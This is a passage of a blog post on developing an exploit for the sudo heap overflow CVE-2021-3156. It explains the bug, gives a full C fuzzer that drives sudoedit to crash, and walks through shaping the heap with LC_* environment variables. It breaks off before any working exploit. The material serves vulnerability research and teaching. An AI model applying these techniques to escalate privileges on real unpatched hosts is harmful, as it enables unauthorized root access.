<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Exploiting CVE-2021-3156 (sudo heap overflow)" /><meta name="author" content="RAC" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction Last month, in this article, Qualys disclosed a vulnerability that has been affecting all versions of the program sudo for the last 10 years which can lead to a local privilege escalation. While they suggested some exploitation paths, they didn’t provide a PoC so I thought I would take a stab at exploiting this bug myself." /><meta property="og:description" content="Introduction Last month, in this article, Qualys disclosed a vulnerability that has been affecting all versions of the program sudo for the last 10 years which can lead to a local privilege escalation. While they suggested some exploitation paths, they didn’t provide a PoC so I thought I would take a stab at exploiting this bug myself." /><link rel="canonical" href="https://richard-ac.github.io/posts/sudo-cve/" /><meta property="og:url" content="https://richard-ac.github.io/posts/sudo-cve/" /><meta property="og:site_name" content="RAC Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-16T19:33:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Exploiting CVE-2021-3156 (sudo heap overflow)" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@RAC" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"RAC"},"description":"Introduction Last month, in this article, Qualys disclosed a vulnerability that has been affecting all versions of the program sudo for the last 10 years which can lead to a local privilege escalation. While they suggested some exploitation paths, they didn’t provide a PoC so I thought I would take a stab at exploiting this bug myself.","url":"https://richard-ac.github.io/posts/sudo-cve/","@type":"BlogPosting","headline":"Exploiting CVE-2021-3156 (sudo heap overflow)","dateModified":"2021-09-18T09:23:10+08:00","datePublished":"2021-02-16T19:33:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://richard-ac.github.io/posts/sudo-cve/"},"@context":"https://schema.org"}</script><title>Exploiting CVE-2021-3156 (sudo heap overflow) | RAC Blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script> <script defer src="/app.js"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-9VRMP80RNQ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-9VRMP80RNQ'); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sample/RAC.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">RAC Blog</a></div><div class="site-subtitle font-italic">Exploit Development, Vulnerability Research and Systems Programming</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/disclosures/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>DISCLOSURES</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Richard-AC" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xrac','protonmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Exploiting CVE-2021-3156 (sudo heap overflow)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Exploiting CVE-2021-3156 (sudo heap overflow)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Feb 16, 2021, 7:33 PM +0800" > Feb 16, 2021 <i class="unloaded">2021-02-16T19:33:00+08:00</i> </span> by <span class="author"> RAC </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 18, 2021, 1:23 AM +0000" > Sep 18, 2021 <i class="unloaded">2021-09-18T09:23:10+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1803 words">10 min</span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><hr /><p>Last month, in <a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">this article</a>, Qualys disclosed a vulnerability that has been affecting all versions of the program <strong>sudo</strong> for the last 10 years which can lead to a local privilege escalation. While they suggested some exploitation paths, they didn’t provide a PoC so I thought I would take a stab at exploiting this bug myself.</p><p>The list of vulnerable versions is in the original article. Here I will be using sudo 1.8.31 on ubuntu 20.04.</p><h2 id="the-bug">The Bug</h2><hr /><p>The vulnerable code is in the <em>set_cmnd</em> function in plugins/sudoers/sudoers.c. Here is a copy :</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="p">(</span><span class="n">to</span> <span class="o">=</span> <span class="n">user_args</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="n">from</span> <span class="o">=</span> <span class="o">*</span><span class="n">av</span><span class="p">);</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">from</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">from</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\\'</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isspace</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">from</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
			    <span class="n">from</span><span class="o">++</span><span class="p">;</span>
			<span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
		    <span class="p">}</span>
		    <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="sc">' '</span><span class="p">;</span>
		<span class="p">}</span>

</pre></table></code></div></div><p>This code copies the command line arguments provided by the user (stored in <code class="language-plaintext highlighter-rouge">av</code>) into the buffer <code class="language-plaintext highlighter-rouge">user_args</code>.</p><p>Before reaching this code, special characters are escaped by prepending a backslash to them. This is why whenever, ‘\’ is encountered, the parser skips a byte (line 3-5). It expects that every ‘\’ is followed by a special character.</p><p>But what if a command line argument actually contained a ‘\’ ? The parser would skip it and copy the next char directly. ‘AB\CD’ would get parsed as ‘ABCD’.</p><p>Now what if the command line argument ended with a ‘\’ ? The parser would skip it, copy the string-terminating null byte to <code class="language-plaintext highlighter-rouge">user_args</code> and increment the variable <code class="language-plaintext highlighter-rouge">to</code> which would now point 1 byte past the buffer. It would then continue copying whatever happens to be in memory after the command line argument (meaning, the other arguments and then the environment variables).</p><p>Normally this would not be possible because sudo should escape the ‘\’ character. However, the Qualys researcher discovered that if <strong>sudoedit -s</strong> (which is a symlink to sudo)is used instead of <strong>sudo</strong>, no escaping is done. This little subtlety might explain why this bug went unnoticed for so many years.</p><p>Let’s try triggering the bug :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/trigger.png" alt="sudo" /></p><p>As you can see, depending on the length of the overflow, we get different crashes.</p><p>This overflow is ideal for a few reasons :</p><ul><li>We control the size of the allocation (it’s the length of the argument) and its content<li>We control the length and content of the overflow (through environment variables)<li>We can insert null bytes (if the string is just “\”, the backslash gets skipped and only the null byte is copied)</ul><p>However, I didn’t really know what to aim for with the overflow so my first approach was to randomly generate the parameters we control and look for interesting crashes.</p><h2 id="fuzzing-to-the-rescue">Fuzzing to the rescue</h2><hr /><p>Here is the fuzzer I wrote :</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
</pre><td class="rouge-code"><pre><span class="cp">#include&lt;unistd.h&gt;
#include&lt;stdio.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;time.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;sys/wait.h&gt;
#include&lt;string.h&gt;
</span>
<span class="cp">#define NB_ITER 5000
</span>
<span class="cp">#define MAX_LEN 20000
#define MAX_ENV 300
</span>
<span class="cm">/* Generates a string that is either a single '\'
 * or a random number of 'A' followed by a '\' */</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">rand_str</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">2</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">MAX_LEN</span><span class="p">;</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">r</span><span class="o">+</span><span class="mi">3</span><span class="p">);</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">r</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\\'</span><span class="p">;</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">r</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\\'</span><span class="p">;</span>
        <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">buf</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
    <span class="kt">int</span> <span class="n">nbr_env</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">env</span><span class="p">[</span><span class="n">MAX_ENV</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="n">NB_ITER</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>

        <span class="cm">/* Generate an environment of 
         * random length composed of 
         * random strings */</span>
        <span class="n">nbr_env</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">MAX_ENV</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">nbr_env</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">env</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand_str</span><span class="p">();</span>
        <span class="p">}</span>
        
        <span class="cm">/* Generate a command line argument 
         * of the form "AAAAAAAAAA\" */</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">argument</span> <span class="o">=</span> <span class="n">rand_str</span><span class="p">();</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">argument</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">);</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/usr/local/bin/sudoedit"</span><span class="p">,</span> <span class="s">"-s"</span><span class="p">,</span><span class="n">argument</span><span class="p">,</span><span class="nb">NULL</span><span class="p">};</span>

        <span class="n">pid_t</span> <span class="n">childpid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">childpid</span><span class="p">){</span>
            <span class="c1">// Parent process </span>
            <span class="n">waitpid</span><span class="p">(</span><span class="n">childpid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ret</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> 
            <span class="k">if</span><span class="p">(</span><span class="n">j</span><span class="o">%</span><span class="mi">50</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"#%d : %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="cm">/* If the child segfaults, we log
             * the parameters in a file */</span>
            <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">139</span><span class="p">){</span> 
                <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
                <span class="n">sprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"crash_%d"</span><span class="p">,</span><span class="n">j</span><span class="p">);</span>     
                <span class="kt">FILE</span> <span class="o">*</span><span class="n">crash_report</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
                <span class="n">fwrite</span><span class="p">(</span><span class="s">"env = {</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">crash_report</span><span class="p">);</span>
                <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">nbr_env</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                    <span class="n">fwrite</span><span class="p">(</span><span class="n">env</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">env</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">crash_report</span><span class="p">);</span>
                    <span class="n">fwrite</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">crash_report</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="n">fwrite</span><span class="p">(</span><span class="s">"}</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">crash_report</span><span class="p">);</span>
                <span class="n">fwrite</span><span class="p">(</span><span class="s">"argv = {</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">crash_report</span><span class="p">);</span>
                <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">3</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                    <span class="n">fwrite</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">crash_report</span><span class="p">);</span>
                    <span class="n">fwrite</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">crash_report</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="n">fwrite</span><span class="p">(</span><span class="s">"}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">crash_report</span><span class="p">);</span>
                <span class="n">fclose</span><span class="p">(</span><span class="n">crash_report</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">nbr_env</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">free</span><span class="p">(</span><span class="n">env</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
            <span class="c1">// Child process </span>
            <span class="c1">// Run the program</span>
            <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
            <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
            <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
            <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
            <span class="n">execve</span><span class="p">(</span><span class="s">"/usr/local/bin/sudoedit"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>A problem I encountered was that when the program didn’t crash, the fuzzer would get stuck on the sudo password prompt. To fix that, I grabbed the <a href="https://www.sudo.ws/download.html#source">source</a> and patched the password checking function in plugins/sudoers/auth/sudo_auth.c to always fail.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/patch_sudo.png" alt="sudo" /></p><p>This fuzzer found many different crashes that I inspected in gdb. Using the pwndbg command <code class="language-plaintext highlighter-rouge">vis &lt;nbr of chunks&gt;</code> allows us to view a given number of chunks on the heap. (beware that a corrupted size field will trip up the visualization).</p><p>By searching for a long string of ‘A’ we can easily locate our overflown chunk.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/our_overflown_chunk.png" alt="sudo" /></p><p>But looking up in the heap we see another interesting chunk which stores the value of an environment variable (that we can control):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/interesting_chunk.png" alt="sudo" /> <em>The LANG environment variable gets copied high up on the heap</em></p><p>I tried changing the length of the variable and observing the heap and noticed that certain lengths resulted in a freed chunk being located up on the heap when our bug is triggered. This is interesting for us because if our chunk fits in this free space, then it might get allocated there. The overflow will corrupt a different part of the heap thus creating different crashes.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/control_env.png" alt="sudo" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/freed_chunk.png" alt="sudo" /></p><p>It turns out that sudo uses <a href="https://www.ibm.com/support/knowledgecenter/ssw_aix_71/globalization/understand_locale_environ_var.html">LC Environment Variables</a> for multicultural support. They get copied on the heap and then freed early in the the execution which affects the state of the heap. I modified my “fuzzer” to also generate LC variables of random lengths.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>        <span class="k">if</span><span class="p">(</span><span class="n">rand</span><span class="p">()){</span>
            <span class="n">LC_ALL_</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">MAX_LEN</span><span class="o">+</span><span class="mi">18</span><span class="p">);</span>
            <span class="n">strncpy</span><span class="p">(</span><span class="n">LC_ALL_</span><span class="p">,</span> <span class="s">"LC_ALL="</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
            <span class="n">LC_ALL_</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
